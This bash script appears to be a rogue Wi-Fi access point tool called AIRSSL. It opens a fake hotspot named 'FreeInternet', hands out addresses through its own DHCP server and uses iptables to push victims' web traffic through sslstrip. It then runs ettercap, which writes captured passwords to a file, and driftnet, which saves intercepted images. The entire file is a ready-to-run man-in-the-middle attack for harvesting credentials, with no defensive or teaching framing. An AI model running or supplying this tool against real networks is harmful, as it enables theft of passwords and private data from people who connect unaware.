#!/bin/bash

#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
transparent="\e[0m"

# Design
function top(){
	clear
	sleep 0.1 && echo -e "$blue "
 		sleep 0.1 && echo -e "	 ___  _____   _____ _ __  "
		sleep 0.1 && echo -e "	/ __|/ _ \ \ / / _ \ |_ \ "
		sleep 0.1 && echo -e "	\__ \  __/\ V /  __/ | | |"
		sleep 0.1 && echo -e "	|___/\___| \_/ \___|_| |_|"
                         
        sleep 0.1 && echo -e "$transparent"
	echo
	echo
}

top

if [[ $EUID -ne 0 ]]; then
        echo -e $red"You do not have admin privilegies, execute the script as root!!!"$transparent""
        exit 1
fi

# Windows and Resolution
function setresolution {
	function resA {
		TOPLEFT="-geometry 90x13+0+0"
		TOPRIGHT="-geometry 83x26-0+0"
		BOTTOMLEFT="-geometry 90x24+0-0"
		BOTTOMRIGHT="-geometry 75x12-0-0"
		MIDDLELEFT="-geometry 91x42+0+300"
		MIDDLERIGHT="-geometry 83x26-0+300"
	}

	function resB {
		TOPLEFT="-geometry 92x14+0+0"
		TOPRIGHT="-geometry 68x25-0+0"
		BOTTOMLEFT="-geometry 92x36+0-0"
		BOTTOMRIGHT="-geometry 74x20-0-0"
		MIDDLELEFT="-geometry 100x14+0+300"
		MIDDLERIGHT="-geometry 74x14-0+300"
	}
	function resC {
		TOPLEFT="-geometry 100x14+0+0"
		TOPRIGHT="-geometry 100x14-0+0"
		BOTTOMLEFT="-geometry 100x14+0-0"
		BOTTOMRIGHT="-geometry 100x14-0-0"
		MIDDLELEFT="-geometry  100x14+0+300"
		MIDDLERIGHT="-geometry 100x14-0+300"
	}
	function resD {
		TOPLEFT="-geometry 110x35+0+0"
		TOPRIGHT="-geometry 99x40-0+0"
		BOTTOMLEFT="-geometry 110x35+0-0"
		BOTTOMRIGHT="-geometry 99x30-0-0"
		MIDDLELEFT="-geometry 110x14+0+300"
		MIDDLERIGHT="-geometry 99x14-0+300"
	}
	function resE {
		TOPLEFT="-geometry 130x43+0+0"
		TOPRIGHT="-geometry 68x25-0+0"
		BOTTOMLEFT="-geometry 130x40+0-0"
		BOTTOMRIGHT="-geometry 132x35-0-0"
		MIDDLELEFT="-geometry 130x14+0+600"
		MIDDLERIGHT="-geometry 132x14-0+600"
	}
	function resF {
		TOPLEFT="-geometry 100x17+0+0"
		TOPRIGHT="-geometry 90x27-0+0"
		BOTTOMLEFT="-geometry 100x30+0-0"
		BOTTOMRIGHT="-geometry 90x20-0-0"
		MIDDLELEFT="-geometry  100x14+0+300"
		MIDDLERIGHT="-geometry 90x14-0+300"
	}
}

setresolution

detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)

case $detectedresolution in
	"1024x600" ) resA ;;
	"1024x768" ) resB ;;
	"1280x768" ) resC ;;
	"1366x768" ) resC ;;
	"1280x1024" ) resD ;;
	"1600x1200" ) resE ;;
	"1366x768"  ) resF ;;
		  * ) resA ;;
esac
#end of windows and resolution

# Dhcpd creation
mkdir -p "airssl"
echo "default-lease-time 600;
max-lease-time 7200;

subnet 10.0.0.0 netmask 255.255.255.0 {
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;

option domain-name "\"pafap.com\"";
option domain-name-servers 10.0.0.1;

range 10.0.0.20 10.0.0.50;

}" > airssl/dhcpd.conf

# Network question
echo -ne $green"[+]Getting the network gateway IP address -->"
gatewayip=$(route | grep 'default' | awk '{print $2}')
echo -e $blue"Done!!!"$transparent
echo -e $green"[+]Getting the interface thats connected to the internet...!"
ifs=()
ifs+=$(iw dev | grep -i "interface" | awk '{print $2}')
for i in ${ifs}
do 
	status=$(sudo ethtool $i | grep -i "link detected" | awk '{print $3 }')
	if [ $status = "yes" ] ; then
		echo -e $red$i "is selected for internet connection!!!"
		internet_interface=$i
	else
		echo -e $red$i "is selected for the fake access point!!!"
		fakeap_interface=$i
	fi
done
echo -e $blue"Done!!!"$transparent

# Fake acess point setup
echo -ne $green"[+] Configuring Fake Access Point...!"
ESSID="FreeInternet"
xterm $MIDDLERIGHT -T STARTINTERFACE -e sudo airmon-ng start $fakeap_interface
ifm=()
ifm+=$(iw dev | grep -i "interface" | awk '{print $2}')
for j in ${ifm}
do 
	result=$(sudo iwconfig $j | grep Monitor | awk '{print $1 }')
	if [ -n "$result" ] ; then
		IFMON=$j
	fi
done
xterm $TOPLEFT -fg red -T FreeInternet -e airbase-ng -c 11 -P -C 30 --essid "$ESSID" $IFMON &
sleep 2
echo -e $blue"Done!!!"$transparent

# Tables
echo -ne $yellow"[+] Configuring forwarding tables..."
ifconfig lo up
ifconfig at0 up &
sleep 1
ifconfig at0 10.0.0.1 netmask 255.255.255.0
ifconfig at0 mtu 1472
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p udp -j DNAT --to $gatewayip
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface $internet_interface -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
echo -e $blue"Done!!!"$transparent


# DHCP
echo -ne $yellow"[+] Setting up DHCP..."
xterm $TOPRIGHT -fg blue -T DHCP -e dhcpd -d -f -cf "airssl/dhcpd.conf" at0 &
sleep 3
echo -e $blue"Done!!!"$transparent

# sslstrip
echo -ne $yellow"[+] Starting sslstrip..."
xterm $BOTTOMLEFT -T SSLSTRIP -e sslstrip -f -p -k 10000 &
xterm $MIDDLELEFT -T SSLSTRIP-MONITOR -e tail -f sslstrip.log &
sleep 2
echo -e $blue"Done!!!"$transparent

# Ettercap
echo -ne $yellow"[+] Starting ettercap..."
xterm $BOTTOMRIGHT -T ETTERCAP -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w airssl/passwords -i at0 &
sleep 1
echo -e $blue"Done!!!"$transparent

# Driftnet
echo -ne "[+] Starting driftnet..."
mkdir -p "airssl/driftnetdata"
xterm $MIDDLERIGHT -T DRIFTNETDATA -e driftnet -i $internet_interface -p -d airssl/driftnetdata &
sleep 3
echo -e $blue"Done!!!"$transparent

# Clean up
while true; do
	echo -ne $yellow"[*] Do you want to finnish? "$transparent
	read WISH

	if [ $WISH = "y" ]; then
		sudo killall xterm
		sudo echo "0" > /proc/sys/net/ipv4/ip_forward
		sudo iptables --flush
		sudo iptables --table nat --flush
		sudo iptables --delete-chain
		sudo iptables --table nat --delete-chain
		xterm $TOPRIGHT -T STOPINTERFACE -e sudo airmon-ng stop $IFMON
		echo -e $red"[+] Clean up successful..."
		echo -e $red"[+] Thank you for using AIRSSL, Good Bye..."
		exit
	fi
done
exit
